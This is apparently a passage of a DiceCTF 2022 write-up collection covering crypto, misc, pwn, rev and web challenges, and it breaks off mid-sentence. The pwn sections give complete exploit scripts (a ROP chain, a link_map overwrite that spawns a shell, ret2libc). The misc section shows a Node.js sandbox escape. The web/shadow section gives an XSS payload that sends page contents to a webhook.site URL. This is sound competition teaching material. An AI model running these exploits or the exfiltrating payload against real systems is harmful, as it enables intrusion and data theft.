jump misc/sober-bishop clubby789 jump misc/Vinegar kmh TODO misc/TI-1337 Silver Edition kmh TODO misc/Cache On The Side wiresboy TODO misc/5D File System with Multiverse Time Travel poortho TODO"},{"location":"Writeup/DiceCTF%202022/#pwn","title":"Pwn","text":"Challenge name Author Writeup pwn/interview-opportunity smoothhacker jump pwn/baby-rop ireland jump pwn/data-eater KyleForkBomb jump pwn/chutes-and-ladders bosh TODO pwn/containment hgarrereyn TODO pwn/memory hole chop0 TODO pwn/nightmare pepsipu jump pwn/road-to-failure NotDeGhost jump"},{"location":"Writeup/DiceCTF%202022/#rev","title":"Rev","text":"Challenge name Author Writeup rev/flagle infuzion TODO rev/hyperlink BrownieInMotion TODO rev/taxes hgarrereyn TODO rev/dicecraft hgarrereyn TODO rev/cable management evilmuffinha TODO rev/typed aplet123 jump rev/breach hgarrereyn TODO rev/universal ireland jump]"},{"location":"Writeup/DiceCTF%202022/#web","title":"Web","text":"Challenge name Author Writeup web/knock-knock BrownieInMotion jump web/blazingfast larry link web/no-cookies BrownieInMotion TODO web/flare larry TODO web/vm-calc Strellic link web/noteKeeper Strellic link web/dicevault arxenix jump web/denoblog Strellic link web/carrot larry TODO web/shadow arxenix jump"},{"location":"Writeup/DiceCTF%202022/#writeups","title":"Writeups","text":""},{"location":"Writeup/DiceCTF%202022/#cryptobaby-rsa","title":"crypto/baby-rsa","text":"<p>256-bit RSA where $e^2 | p-1, q-1$. Intended solution = factor $N$ with cado-nfs, then use sage's <code>nth_root()</code> function to get all candidate decryptions. Finally, combine using Chinese Remainder Theorem.</p> <p>The <code>nth_root()</code> algorithm is described in this paper. It's simple for $e | p-1$, but for higher-powers of $e$ involves solving a (small) discrete logarithm problem. Fortunately, sage has it implemented as a built-in.</p> <p>Many resources online describe how to proceed if <code>e | p-1</code>, but they don't describe the general case for higher powers of <code>e</code>.</p> <pre><code>from Crypto.Util.number import long_to_bytes\n\nN = 57996511214023134147551927572747727074259762800050285360155793732008227782157\ne = 17\ncipher = 19441066986971115501070184268860318480501957407683654861466353590162062492971\n# factor with cado-nfs\np, q = 172036442175296373253148927105725488217, 337117592532677714973555912658569668821\n\nassert p * q == N\n\np_roots = mod(cipher, p).nth_root(e, all=True)\nq_roots = mod(cipher, q).nth_root(e, all=True)\n\nfor xp in p_roots:\n    for xq in q_roots:\n        x = crt([Integer(xp), Integer(xq)], [p,q])\n        x = int(x)\n        flag = long_to_bytes(x)\n        if flag.startswith(b\"dice\"):\n            print(flag.decode())\n</code></pre>"},{"location":"Writeup/DiceCTF%202022/#cryptorejected","title":"crypto/rejected","text":"<p>Whenever the RNG has to reroll, then it means that the highest bit of the output is <code>1</code>. This lets you launch a known-plaintext attack on the underlying LFSR. Solve the resulting linear system (over <code>GF(2)</code>) and find the flag.</p> <p>You don't really get much information if the RNG doesn't reroll. A good choice of modulus is <code>(2^32 // 3) + 1</code> or <code>(2^32 // 4) + 1</code>, as this will increase the chances of the RNG rerolling.</p>"},{"location":"Writeup/DiceCTF%202022/#cryptocorrelated","title":"crypto/correlated","text":"<p>A correlation attack on a LFSR, this challenge artificially demonstrates how you can attack a filtered LFSR.</p> <p>If you have 48 (= length of seed) clean bits, then you can invert the LFSR stream and find the seed. As each bit in the output stream is correct with 80% probability, you should expect to try <code>1 / 0.8^48 = 45,000</code> different subsets of the output stream before it works. As you are given 20,000 output bits, this is no problem at all.</p> <p>Unmodified information set decoding also works, mainly because the dimension of the LFSR is so small.</p> <p>You can also solve this with a customized fast correlation attack if you find sparse linear relations for the LFSR. As the state space is 2^48, you can use a birthday attack/meet-in-the-middle to find random linear relations each of length 3 which collide. That will give you a length 6 linear relation for the LFSR. This is much more complicated than the other solutions.</p>"},{"location":"Writeup/DiceCTF%202022/#cryptocommitment-issues","title":"crypto/commitment-issues","text":"<p>We are given the result of a commitment of a signature of the flag. In particular, we have a large semiprime $N = pq$, a public exponenent $e$ with inverse $d$, and if <code>m = bytes_to_long(flag)</code>, then $s = m^d \\pmod{N}$ is the signature. A random value $r$ is then generated and we're given $c_1 = s + r \\pmod{N}$ and $c_2 = r^5 \\pmod{N}$.</p> <p>There's multiple ways to ultimately do the same computations that lead to the flag. I'll describe a solution that's due to Utaha from Balsn.</p> <p>Notice that the polynomial $p(t) = (c_1 - t)^5 - c_2 \\in \\mathbb{Z}N[t]$ vanishes at $t = s$. We then consider the quotient ring $\\mathbb{Z}_N[t]/(p)$. Since the lead coefficient of $p$ is a unit, this is a free $\\mathbb{Z}_N$-module of rank $\\deg p = 5$ with basis ${1, t, ..., t^4}$. In particular any $6$ elements in $\\mathbb{Z}_N[t]/(p)$ will satisfy a non-trivial $\\mathbb{Z}_N$-linear dependence. Using sage to efficiently write $$(t^e)^i = a{i0} + a_{i1}t + \\dots + a_{i4}t^4 \\in \\mathbb{Z}N[t]/(p)$$ for $i = 0, ..., 5$ we can use the matrix $A = (a{ij})_{ij}$ to compute a non-trivial linear dependence $$\\beta_0 + \\beta_1 \\cdot t^e + \\dots + \\beta_5 \\cdot (t^e)^5 = 0 \\in \\mathbb{Z}_N[t]/(p).$$ However since $p(s) = 0 \\pmod{N}$, the evaluation at $s$ map $$\\begin{aligned} E_s :\\;&amp; \\mathbb{Z}_N[t] \\to \\mathbb{Z}_N \\ &amp; \\;\\;\\;\\; q \\longmapsto q(s) \\end{aligned}$$ descends to a valid map $\\mathbb{Z}_N[t]/(p)\\to \\mathbb{Z}_N$ and we find that in fact, $$\\beta_0 + \\beta_1 \\cdot s^e + \\dots + \\beta_5 \\cdot (s^e)^5 = 0 \\pmod{N}.$$ But $s^e = m$ is just the flag, and we can now apply Coppersmith to recover $m$.</p>"},{"location":"Writeup/DiceCTF%202022/#cryptolearning-without-errors","title":"crypto/learning-without-errors","text":"<p>This challenge is based on a passive attack which broke the CKKS cryptosystem last year. The gist of it is that CKKS Ring Learning With Errors cryptosystem encrypts the message as a pair <code>(c_0, c_1) = (a, a * s + m + e)</code> where <code>s</code> is the secret, <code>m</code> is the message, <code>a</code> is a random ring element, and <code>e</code> is a \"small\" secret error. If <code>e</code> and <code>s</code> are unknown, then recovering <code>m</code> from this requires solving a hard lattice problem. However, when decrypting, CKKS returns <code>m + e</code>, which just ... tells you ... what the secret error is.</p> <p>Basic algebra then gives <code>s = (c_1 - (m + e)) * c_0^{-1}</code>. Therefore, seeing a pair of encrypted and decrypted values is enough for a passive adversary to completely recover the secret key!</p> <p>However, this does seemingly require <code>c_0</code> to be invertible in the ring, which for our parameters is <code>Zmod(2^100)[x] / [x^1024]</code>. The power-of-two modulus does (or so I thought) raise an issue.</p> <pre><code>q = 1 &lt;&lt; 100\nN = 10\nRbase.&lt;x&gt; = PolynomialRing(Zmod(q))\nR.&lt;x&gt; = Rbase.quotient(x^N + 1)\n</code></pre> <p>Based on my testing, I had assumed that with overwhelming probability, <code>c_0</code> would not have an inverse in the ring. This would force competitors to find another way to compute the required division. This appears to be supported by the linked paper (on page 18):</p> <p>A little difficulty arises due to the choice of q. The first implementation of CKKS, the HEAAN library sets q to a power of 2 to simplify the treatment of floating point numbers. Subsequent instantiations of CKKS use a prime (or square-free) q of the form h \u00b7 2^n + 1 together with the Number Theoretic Transform for very fast ring operations. For a (sufficiently large) prime q, the probability of a random element a being invertible is very close to 1, but this is not the case when q is a power of two. If a is not invertible, we can still recover partial information about the secret key s, and completely recover s by using multiple ciphertexts.</p> <p>My solution computes the inverse of <code>c_0</code> in the p-adic extension to R with 20480 digits of precision. (Such extremely high precision is needed because the quotient polynomial <code>I = x^1024 + 1</code> has <code>I.discriminant() = 2^10240</code>).</p> <p>However, some teams just... got lucky... and had a <code>c_0</code> which was invertible. I'm not sure what the chances of this happening were -- clearly my initial tests led me to the wrong conclusion.</p> <p>The challenge still had a low number of solves, probably because RLWE is not common in CTFs.</p>"},{"location":"Writeup/DiceCTF%202022/#cryptoshibari","title":"crypto/shibari","text":"<p>This challenge implements a very weird compiler using a representation of the Braid Group.</p> <p>Braid Groups have previously been used in cryptography to implement a non-commutative variant of Diffie-Hellman. This was also the concept behind the proposed post-quantum (but actually completely insecure) scheme WalnutDSA.</p> <p>The cryptographically-interesting property of Braid Groups is that they have a computationally efficient normal form. That is, while there are (infinitely) many ways to write an element of the braid group in terms of the generators, you can convert all representations into the same canonical form.</p> <p>This has been proposed as a way to hide the individual factors of a product of group elements <code>a * b * c</code>.</p> <p>This challenge used the fact that the group-action of the braid group with $n$ strands on $AlternatingGroup(5)^{(2 n)}$ induced by the Yang-Baxter equation is sufficiently expressive that it is Turing complete. Specifically, you can evaluate <code>CCNOT</code> gates, which are computationally universal. The bulk of the source code provided for this challenge consists of a circuit-to-braid compiler and a braid-circuit evaluator.</p> <p>Additionally, I provided python bindings for a very fast braid group library, which can compute the canonical forms for the braids. I also presented a C++ version of the braid-circuit evaluator, which takes around 0.1 seconds to evaluate each sub-circuit.</p> <p>With all this done, we can finally discuss the challenge.</p> <p>The intended solution is 2 parts: 1) the braid is already in normal form, so you can import it into LNF faster than computing LNF on it. 2) apply a length-based attack because the entire circuit is reversible.</p> <p>if you guess that the first few gates are performing the subcircuit <code>A := NOT bit 0; CCNOT(0,1,2)</code> then the length of the circuit <code>A^-1 * Circuit</code>  should be \"shorter\" than the length of <code>Circuit</code>, where length is the length of the LNF canonical form</p> <p>Whereas if you guess wrong and try the circuit <code>B := NOT bit 0; NOT bit 1; CCNOT(0,1,2)</code>, then the length of the circuit <code>B^-1 * Circuit</code>  should be longer than the length of <code>Circuit</code>. So you can bruteforce the flag 2-bits at a time</p> <p>the step 1) of importing into LNF is needed because computing the LNF is so slow for the obfuscated braids (it's pretty quick for the unobfuscated braids). And the provided python bindings support quickly computing the LNF of  <code>LNF(a) * LNF(b)</code></p> <p>In hindsight, I should have released the LNF form of the braids so that players didn't have to import it.</p> <p>The only solution during the competition to this challenge used GPU brute force to find the flag \\shrug. I estimate that this took the equivalent of 10-years of cpu time. This was completely unintended.</p>"},{"location":"Writeup/DiceCTF%202022/#miscundefined","title":"misc/undefined","text":"<p>Node.js wraps modules in a top-level function where <code>require</code> is passed in as an argument, meaning that <code>require</code> will always be accessible from <code>arguments</code>. However, since <code>arguments</code> is shadowed, you have to first create a function then access the parent function's arguments via <code>arguments.callee.caller.arguments</code>:</p> <pre><code>(function(){return arguments.callee.caller.arguments[1](\"fs\").readFileSync(\"/flag.txt\", \"utf8\")})()\n</code></pre> <p>For some reason, when making the challenge, I thought <code>import</code> wouldn't work due to Node defaulting to common.js modules, but it does for some reason, so there's a much easier cheese:</p> <pre><code>import(\"fs\").then(m=&gt;console.log(m.readFileSync(\"/flag.txt\", \"utf8\")))\n</code></pre>"},{"location":"Writeup/DiceCTF%202022/#miscsober-bishop","title":"misc/sober-bishop","text":"<p>To solve the challenge, players must find a flag which can be passed into OpenSSH's randomart algorithm. Due to the high-collision nature of the function, <code>randomart(md5(flag))</code> is also provided. We need to implement a high-performance algorithm to identify valid paths through the grid. My approach was this: 1. Starting at our inital point, try moving to a diagonally adjacent position 2. Append the new position to a list of positions 3. Check if the number of times the current position appears in the list exceeds the number of times indicated by the grid    - If we are at the end position, go to step 5    - If it does not exceed, then try moving to a new position    - If it does, then pop the current position off the list 4. Repeat steps 1-3 on the next of the four possible positions 5. Convert the list of coordinates to a series of two-bit pairs, and convert them to a byte array 6. Check if the <code>randomart(md5(array))</code> matches the provided randomart    - If not, return to step 3    - If so, we're done, and print our flag</p> <p>To optimise this approach:  - For the initial 4 positions, we can split the work across multiple cores easily, each exploring potential paths  - We know the start position, and the first 5 characters (<code>dice{</code>). Therefore we can hardcode the first 21 positions  - At each position, we can convert our path to a string and check if it meets the constraints (begins with <code>dice{</code>, all lowercase alphanumeric). If not, we can backtrack  - If we have a 'complete' flag <code>dice{[a-z0-9]+}</code>, we can verify that each position has been visited the correct number of times  - If all this is the case, we can attempt to calculate the MD5</p> <p>My Rust solution took 20 seconds to extract the flag <code>dice{unr4nd0m}</code> </p>"},{"location":"Writeup/DiceCTF%202022/#pwnbaby-rop","title":"pwn/baby-rop","text":"<p>The challenge is a simple use-after-free, but with a few mitigations to make exploitation harder.</p> <p>Because the challenge uses a struct with a <code>char *</code>, players can easily turn the use-after-free into an arbitrary read and write without specialized heap voodoo. PIE is disabled because I'm nice.</p> <p>The challenge has several mitigations.</p> <p>1) the glibc version is 2.34 (as printed out 3 different times when you connect to the server), which removed the <code>__free_hook</code> and <code>__malloc_hook</code> flags 2) full RELRO is used, which removes another collection of function pointers to overwrite 3) the binary uses seccomp to ban the <code>execve</code> syscall. So both calling a one-gadget and calling <code>system(\"/bin/sh\")</code> are off the table. 4) ASLR (but not PIE) is enabled, so the location of the stack is randomized.</p> <p>As the challenge name indicates, you are supposed to ROP your way to the flag, using an open-read-write ROP chain. So now the question is -- how can you turn your arbitrary read/write into a ROP chain? First, you'll need to leak a stack address.</p> <p>A nice description of how to leverage arbitrary reads in the binary/libc/heap/stack to determine the location of everything else can be found in this blog post. Note: these techniques were also heavily featured in the <code>breach</code> and <code>containment</code> challenges!</p> <p>The crucial section is that <code>libc</code> contains an <code>environ</code> pointer which points to a location on the stack.</p> <p>The sequence is: 1) read GOT to leak a libc address 2) read libc-&gt;environ to leak a stack address 3) compute the offset to the saved return addresses 4) ROP your way to the flag!</p> <p>Some teams had solutions which worked locally but not on remote. Some common fixed to these problems were: 1) use a write syscall instead of <code>puts()</code> to print the flag 2) double-check that the offset between <code>*environ</code> and the saved return address is correct on remote (should be <code>-0x140</code>). This has some slight variation depending on your configuration, but it's not hard to brute-force and check whether you're correct 3) using <code>.bss</code> as temporary storage instead of the heap. For whatever reason, exploits which tried to read the contents of <code>flag.txt</code> onto the heap were unreliable 4) open <code>flag.txt</code> in read-only mode. The redpwn jail we were using didn't support writing to disk 5) end your rop chain with an <code>exit(0)</code> syscall, which has the side-effect of flushing stdout</p> <p>My exploit is the following</p> <pre><code>from pwn import *\n\ndef split_before(s, t):\n    i = s.index(t)\n    return s[:i]\n\ndef split_after(s, t):\n    i = s.index(t)\n    return s[len(t) + i:]\n\n\n#################################################\n\ncontext.terminal = [\"tmux\", \"splitw\", \"-h\"]\ncontext.arch = 'amd64'\ncontext.binary = \"./run\"\n\nhost = args.HOST or 'localhost'\nport = args.PORT or 31245\n\nif args.LOCAL:\n    r = process(\"./run\", env = {'LD_PRELOAD' : './libc.so.6'})\nelse:\n    r = remote(host, port)\n\nbinary = ELF(\"./run\")\nlibc = ELF(\"./libc.so.6\")\n\nmalloc_libc_OFFSET = libc.symbols[\"malloc\"]\nfree_libc_OFFSET = libc.symbols[\"free\"]\n\n\n#################################################\n\ndef xfree(idx):\n    print(r.recvuntil(b\"enter your command: \").decode())\n    r.sendline(b\"F\")\n    print(r.recvuntil(b\"enter your index: \").decode())\n    r.sendline(\"{}\".format(idx).encode())\n\ndef xread(idx):\n    print(r.recvuntil(b\"enter your command: \").decode())\n    r.sendline(b\"R\")\n    print(r.recvuntil(b\"enter your index: \").decode())\n    r.sendline(\"{}\".format(idx).encode())\n\ndef xwrite(idx, value=b\"\"):\n    print(r.recvuntil(b\"enter your command: \").decode())\n    r.sendline(b\"W\")\n    print(r.recvuntil(b\"enter your index: \").decode())\n    r.sendline(\"{}\".format(idx).encode())\n    print(r.recvuntil(b\"enter your string: \").decode())\n    r.sendline(value)\n\ndef xcreate(idx, length, value=b\"\"):\n    print(r.recvuntil(b\"enter your command: \").decode())\n    r.sendline(b\"C\")\n    print(r.recvuntil(b\"enter your index: \").decode())\n    r.sendline(\"{}\".format(idx).encode())\n    print(r.recvuntil(b\"How long is your safe_string: \").decode())\n    r.sendline(\"{}\".format(length).encode())\n    print(r.recvuntil(b\"enter your string: \").decode())\n    r.sendline(value)\n\n\n#################################################\n\nxcreate(0, 128)\nxcreate(1, 128)\n\nxfree(0)\nxfree(1)\n\ngot_free_addr = binary.symbols['got.free']\npayload = p64(8) + p64(got_free_addr)\nxcreate(2, 16, payload)\n\nxread(0)\n\nprint(r.recvuntil(b\"hex-encoded bytes\\n\").decode())\ns = r.readline()\ns = s.decode()\ns = s.replace(\" \", \"\")\ns = bytes.fromhex(s)\nfree_addr = u64(s)\n\nlibc_base_addr = free_addr - free_libc_OFFSET\n\n# -------------------------------------------------\n\ngot_malloc_addr = binary.symbols['got.malloc']\npayload = p64(8) + p64(got_malloc_addr)\nxwrite(2, payload)\n\nxread(0)\n\nprint(r.recvuntil(b\"hex-encoded bytes\\n\").decode())\ns = r.readline()\ns = s.decode()\ns = s.replace(\" \", \"\")\ns = bytes.fromhex(s)\nmalloc_addr = u64(s)\n\nassert malloc_libc_OFFSET - free_libc_OFFSET == malloc_addr - free_addr\n\n# -------------------------------------------------\n\nlibc_environ_addr = libc_base_addr + libc.symbols[\"environ\"]\npayload = p64(8) + p64(libc_environ_addr)\nxwrite(2, payload)\n\nxread(0)\n\nprint(r.recvuntil(b\"hex-encoded bytes\\n\").decode())\ns = r.readline()\ns = s.decode()\ns = s.replace(\" \", \"\")\ns = bytes.fromhex(s)\nenviron_addr = u64(s)\n\nprint(hex(libc_environ_addr))\nprint(hex(environ_addr))\n\n# -------------------------------------------------\n\nlibc.address = libc_base_addr\nrop = ROP(libc)\n\n# find offset with gdb, might need some brute-force for remote\nrip_addr = environ_addr - 0x140\n\n# new file descriptor, totally brute-forcible\nfd = 3\n# pointer to filename = \"flag.txt\"\ndst_filename = binary.bss(400)\n\nmov_rcx_rdx_addr = libc_base_addr + 0x0016c020 # 2.34\nmov_rcx_rdx = p64(mov_rcx_rdx_addr)\n\nprint(disasm(libc.read(mov_rcx_rdx_addr, 4)))\n\nrop(rcx=dst_filename, rdx=u64(b\"flag.txt\"))\nrop.raw(mov_rcx_rdx)\nrop(rcx=dst_filename + 8, rdx=0)\nrop.raw(mov_rcx_rdx)\n\n# sanity checks\nrop.puts(dst_filename)\nrop.write(1, dst_filename, 16, 1)\n\nrop.open(dst_filename, 0)\nrop.read(fd, dst_filename, 128)\nrop.write(1, dst_filename, 128)\n\n\nrop.exit(0)\n\n\n# -------------------------------------------------\n\n\nreal_payload = rop.chain()\n\npayload = p64(len(real_payload)) + p64(rip_addr)\nxwrite(2, payload)\n\nxwrite(0, real_payload)\n\n# gdb.attach(r)\n\nr.sendline(b\"E0\")\n\nsleep(0.1)\n\nprint(r.recv())\n\n</code></pre>"},{"location":"Writeup/DiceCTF%202022/#pwndata-eater","title":"pwn/data-eater","text":"<p>There's usually a pointer to <code>link_map</code> on the stack somewhere, so just write some data to <code>buf</code> and overwrite the <code>DT_STRTAB</code> pointer in <code>link_map-&gt;l_info</code>.</p> <p>The offset to <code>link_map</code> varies a little bit but this should cover most of the possibilities.</p> <pre><code>def sice(k):\n  print(k)\n  try:\n    # do pwning\n    r = conn()\n    r.sendline(f'%s%{k}$s')\n    r.sendline(b'/bin/sh\\0' + p64(exe.sym['buf'] + 16 - exe.section('.dynstr').index(b'memset\\x00')) + b'system\\0 ' + p64(0)*13 + p64(exe.sym['buf'])[:-1])\n\n    # make sure we got a shell\n    r.recv(timeout=0.1)\n    r.sendline('echo ginkoid')\n    r.recvuntil('ginkoid')\n\n    r.interactive()\n    return True\n  except EOFError:\n    return False\n  finally:\n    r.close()\n\nfor k in range(30, 50):\n  if sice(k): break\n</code></pre> <p>I recently found this doesn't work with <code>ubuntu:18.04</code> and <code>centos:6</code> for some reason, but the 14 other Docker images I tried were okay. Apologies if this caused you trouble! I initially only tested on a couple (including my own host) and it worked on all of them so I didn't bother trying more. </p>"},{"location":"Writeup/DiceCTF%202022/#pwninterview-opportunity","title":"pwn/interview-opportunity","text":"<p>This challenge is a classic return2libc exploit. The bug here is 60 byte overflow into the 10 byte <code>reason</code> char array from the <code>read()</code> function call.</p> <pre><code>...\nint main(int argc, char **argv) {\n  char reason[10];\n  ...\n  read(0, reason, 70);\n  puts(reason);\n}\n</code></pre> <p>The only mitigations that are enabled are NX and ASLR. With NX enabled, we can't use shellcode. So ROP and ret2libc is our workaround. To defeat ASLR we have to do 2 passes. 1) leak the libc base address and return to main. 2) return to <code>system()</code> in libc. I have attached the solution script below.</p> <pre><code>from pwn import *\n\ne = ELF(\"./interview-opportunity\")\nlibc = ELF(\"./libc.so.6\")\ntarget = process(e.path)\ncontext.terminal = [\"tmux\", \"splitw\", \"-v\"]\n\nrdi = 0x401313\n\npayload = b\"A\" * 0x22\npayload += p64(rdi)\npayload += p64(e.got[\"puts\"])\npayload += p64(e.symbols[\"puts\"])\npayload += p64(e.symbols[\"main\"])\n\ntarget.sendline(payload)\n\ntarget.recvuntil(b\"A\" * 0x22)\ntarget.recvline()\n\nleak = u64(target.recvline(keepends=False).ljust(8, b\"\\x00\")) - libc.symbols[\"puts\"]\nprint(\"leak: {:#x}\".format(leak))\n\npayload = b\"A\"*0x22\npayload += p64(rdi + 1)\npayload += p64(rdi)\npayload += p64(next(libc.search(b\"/bin/sh\")) + leak)\npayload += p64(libc.symbols[\"system\"] + leak)\n\ntarget.sendline(payload)\ntarget.interactive()\n</code></pre>"},{"location":"Writeup/DiceCTF%202022/#pwnnightmare","title":"pwn/nightmare","text":"<p>REDACTED: We are redacting the solution for 1 week to give teams an attempt to claim the blood prize! The author writeup will be released after the first solve or the 1 week is up.</p>"},{"location":"Writeup/DiceCTF%202022/#pwnroad-to-failure","title":"pwn/road-to-failure","text":"<p>REDACTED: We are redacting the solution for 1 week to give teams an attempt to claim the blood prize! The author writeup will be released after the first solve or the1 week is up.</p>"},{"location":"Writeup/DiceCTF%202022/#revuniversal","title":"rev/universal","text":"<p>This challenge presents an obfuscate quantum circuit for performing addition based on the Quantum Fourier Transform adder, which is the same addition algorithm featured in the linked writeups from last year's quantum rev challenges. The goal is to determine that number is being added.</p> <p>The obfuscation comes from that all of the <code>Rz(theta)</code> rotations have been converted into long sequences of <code>H</code> and <code>T</code> gates -- thus making the entire quantum circuit only use <code>H, T, CNOT</code> gates. The program I used for this was gridsynth, which is much more efficient than other approaches, eg as given by the construction of the Solovay-Kitaev theorem. No other obfuscations were applied, apart from those required to convert controlled-rotations into a mix of CNOT and single-qubit gates.</p> <pre><code>     $ gridsynth pi/128\n     SHTHTHTHTHTHTHTSHTHTHTHTSHTHTHTHTHTSHTSHTHTHTHTHTSHTHTHTSHTSHTHTSHTSHTSHTHTHTHTS\n     HTHTHTHTHTSHTSHTHTSHTHTSHTSHTSHTSHTHTSHTSHTSHTSHTHTHTSHTSHTSHTHTHTHTSHTHTSHTHTHT\n     SHTHTHTHTSHTHTSHTHTSHTSHTSHTHTHTHTHTHTHTSHTHTSHTHTHTSHTSHTHTHTSHTSHTSHTHTSHTHTHT\n     HTSHTSHTSHSSSWWWWWWW\n</code></pre> <p>The intended solution analyzes the structure of the QFT to isolate where the actual rotations are beign applied. The QFT consists of a long chain of CNOT gates and Rz rotations. The actual adder component consists of only Rz rotations, with no CNOT gates. So the longest chain of gates in the circuit which contains no CNOT gates is the adder. This is the only component which you need to statically analyze. You can determine this by reading about how the QFT works, or by looking at the generate.py script from last year's challenges.</p> <p>The following solution is essentially a quantum disassembler. For each single-qubit chain of H and T gates, it multiplies the gates together to determine what the quantum operator is. Then it determines that the corresponding Z-rotation angle is for this operator.</p> <p>Once all the rotation angles have been recovered, extracting the number being added (ie the flag) proceeds identically to quantum-rev 2 from last year.</p> <pre><code>from math import pi, log2\nimport numpy as np\n\n\n# hadamard gate\nH = 1/np.sqrt(2)*np.array([[1, 1],\n                           [1,-1]], dtype=np.complex128)\n# T-phase gate\nT = np.array([[1, 0],\n              [0, np.exp(1j * pi/4)]], dtype=np.complex128)\n# identity operator\nI = np.array([[1, 0],\n              [0, 1]], dtype=np.complex128)\n\n\n########################################\n\n# num qubits\nn = 256\n# max error\nepsilon = 1e-4\n\n\n\"\"\"\nlook for the start/end of the QFT.\nThis includes a few extra gates (from the QFT)\nfor qubit 0 and 1, so we just ignore those\n\"\"\"\n\nidcs = []\nwith open(\"converted_circuit.qasm\", \"r\")  as f:\n    for i,line in enumerate(f):\n        if line == \"cx q[1],q[0];\\n\":\n            idcs.append(i)\n            # print(i)\n\ni0 = idcs[1]\ni1 = idcs[2]\n\nlines = open(\"converted_circuit.qasm\", \"r\").readlines()\nidcs = [i for i,line in enumerate(lines)]\ngates = lines[i0 + 1:i1 - 1]\n\n\n########################################\n\nunitaries = [I for _ in range(n)]\n\nfor line in gates:\n    instr = line[0]\n    qubit = line[line.find(\"[\")+1:line.find(\"]\")]\n    qubit = int(qubit)\n\n    i = qubit\n    if instr == 't':\n        unitaries[i] = unitaries[i] @ T\n    elif instr == 'h':\n        unitaries[i] = unitaries[i] @ H\n    else:\n        raise ValueError(\"invalid gate\")\n\n\n# correct for QFT spillover\nfor i in range(3):\n    unitaries[i] = I\n\n########################################\n\nbinary_reprs = \"\"\nunitaries = unitaries\n\nfor i,u in enumerate(unitaries):\n    delta = np.abs(u) - I\n    if np.max(np.abs(delta)) &gt; epsilon:\n        raise ValueError(\"unitary is not approximately a phase gate\")\n\n    u /= u[0][0]\n    angle = np.angle(u[1][1])\n\n    b = str(int(angle &lt; 0))\n    binary_reprs += b\n\n\nflag = int(binary_reprs[::-1], 2).to_bytes(n//8, \"little\")\n# first character is wrong b/c we included some extra QFT gates lol\nflag = b\"d\" + flag[1:]\nprint(flag)\n</code></pre> <p>However, during the competition the only solves were from a very amusing approach -- just run the program and it prints out the flag! Apparently the circuit simulator used in qiskit is able to very efficiently emulate the circuit in this problem without ever constructing the full statevector. The statevector has length <code>2^256</code>, so I had assumed that classically simulating the output would be completely impossible. Clearly, the IBM engineers and scientists behind qiskit deserve a raise &gt;_&lt;.</p> <p>The runtime of the below script for me is 45 minutes and it takes &lt; 4 gigs of ram -- much less than 2^256!</p> <pre><code>from qiskit import QuantumCircuit, Aer, execute\nsimulator = Aer.get_backend('aer_simulator')\nqc = QuantumCircuit.from_qasm_file(\"converted_circuit.qasm\")\n\n# add some measurement gates at the end\nqubits = list(range(256))\nqc.measure(qubits, qubits)\njob = execute(qc, simulator)\nresult = job.result()\nprint(result.get_counts())\n\nnum_chars = 256 // 8\nx = list(result.get_counts().keys())[0]\nf = int(x, 2).to_bytes(num_chars, \"little\")\nprint(f)\n</code></pre>"},{"location":"Writeup/DiceCTF%202022/#webknock-knock","title":"web/knock-knock","text":"<p>This challenge gives a pastebin where notes are accessed by <code>id</code> and <code>token</code>. The tokens are generated as follows:</p> <pre><code>  generateToken(id) {\n    return crypto\n      .createHmac('sha256', this.secret)\n      .update(id.toString())\n      .digest('hex');\n  }\n</code></pre> <p>This looks okay, as long as the secret is chosen securely. Let's take a look at where that comes from:</p> <pre><code>  constructor() {\n    this.notes = [];\n    this.secret = `secret-${crypto.randomUUID}`;\n  }\n</code></pre> <p>If you are careful, you can spot the issue here: <code>crypto.randomUUID</code> is a function, but it is not called. Let's see what this looks like:</p> <pre><code>&gt; const crypto = require('crypto')\nundefined\n&gt; const secret = `secret-${crypto.randomUUID}`;\nundefined\n&gt; secret\n'secret-function randomUUID(options) {\\n' +\n  '  if (options !== undefined)\\n' +\n  \"    validateObject(options, 'options');\\n\" +\n  '  const {\\n' +\n  '    disableEntropyCache = false,\\n' +\n  '  } = options || {};\\n' +\n  '\\n' +\n  \"  validateBoolean(disableEntropyCache, 'options.disableEntropyCache');\\n\" +\n  '\\n' +\n  '  return disableEntropyCache ? getUnbufferedUUID() : getBufferedUUID();\\n' +\n  '}'\n&gt; \n</code></pre> <p>Well, it looks like we know the secret. Looking at the source, we see that the flag is at <code>id=0</code>, so we generate a token for that:</p> <pre><code>&gt; crypto.createHmac('sha256', secret).update('0').digest('hex')\n'7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264'\n</code></pre> <p>Making a request to</p> <pre><code>https://knock-knock.mc.ax/note?id=0&amp;token=7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264\n</code></pre> <p>gives us the flag.</p>"},{"location":"Writeup/DiceCTF%202022/#webdicevault","title":"web/dicevault","text":"<p>tl;dr use a combination of <code>history.go(-x)</code> and undocumented <code>history.length</code> xsleak to guess the location of a window and brute force flag path directory-by-directory.</p> <p>unintended: open vault window, redirect to your origin and get it to click vault buttons on your origin :(</p> <pre><code>      async function isLocation(win, url) {\n        win.location = \"about:blank\";\n        await sleep();\n        const hlen1 = win.history.length;\n        win.history.go(-1);\n        await sleep();\n        win.location = url + \"#zzzzz\";\n        win.location = \"about:blank\";\n        await sleep();\n        const hlen2 = win.history.length;\n\n        // reset history to initial state before running this function\n        if (hlen1 + 1 === hlen2) {\n          win.history.go(-2);\n        } else if (hlen1 === hlen2) {\n          win.history.go(-1);\n        }\n        return hlen1 + 1 === hlen2;\n      }\n</code></pre>"},{"location":"Writeup/DiceCTF%202022/#webshadow","title":"web/shadow","text":"<p>full solution:</p> <pre><code>https://shadow.mc.ax/?x=%3Cimg%20src%3D%22x%22%20onerror%3D%22find(%27steal%27)%3Bdocument.execCommand(%27insertHTML%27%2C%20false%2C%20%60%3Csvg%20onload%3D%26%2334%3Bwindow.location%3D%27https%3A%2F%2Fwebhook.site%2Fa602d76c-28a3-4e0a-8793-b183bc9bfba4%3Fa%3D%27%2BencodeURIComponent(this.parentNode.innerHTML)%26%2334%3B%3E%60)%3B%22%3E&amp;y=-webkit-user-modify:%20read-write;\n</code></pre> <p>css payload:</p> <pre><code>-webkit-user-modify: read-write;\n</code></pre> <p>js payload:</p> <pre><code>find('steal');\ndocument.execCommand('insertHTML', false, `&lt;svg onload=\"window.location='https://webhook.site/a602d76c-28a3-4e0a-8793-b183bc9bfba4?a='+encodeURIComponent(this.parentNode.innerHTML)\"&gt;`);\n</code></pre> <p>Use the obscure <code>-webkit-user-modify</code> property to make the div inside the shadowDOM editable then 